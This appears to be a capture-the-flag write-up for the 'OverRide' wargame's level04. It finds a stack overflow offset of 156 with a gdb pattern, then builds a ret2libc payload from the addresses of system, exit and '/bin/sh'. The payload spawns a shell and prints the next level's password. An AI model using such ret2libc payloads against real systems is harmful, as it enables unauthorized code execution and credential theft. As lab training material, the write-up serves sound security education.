# Level 04

So we can see that there is a fixed buffer that will take the input requested for the shell. If we give it input in a certain constrain, probably while we are stil in the stack of the memory, it exists norally, otherwise it halts and stops.
In gdb we can follow the as well the child process using `set follow-fork-mode child` and using our patern generator we can check at what offset is crashes.

```c
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04 
[New process 2493]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2493]
0x41326641 in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xf7fd08c4	-134412092
edx            0xffffd590	-10864
ebx            0x41386541	1094214977
esp            0xffffd630	0xffffd630
ebp            0x31664130	0x31664130
esi            0x0	0
edi            0x66413965	1715550565
eip            0x41326641	0x41326641
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) p (char[4]) 0x41326641
$2 = "Af2A"
```

Our offset is at 156
Now using the `ret2libc` exploit to pop a shell.

```c
(gdb) p system
$3 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$4 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system, +999999999, "/bin/sh"
0xf7f897ec
level04@OverRide:~$ python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/ex
level04@OverRide:~$ cat /tmp/ex - | ./level04 
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
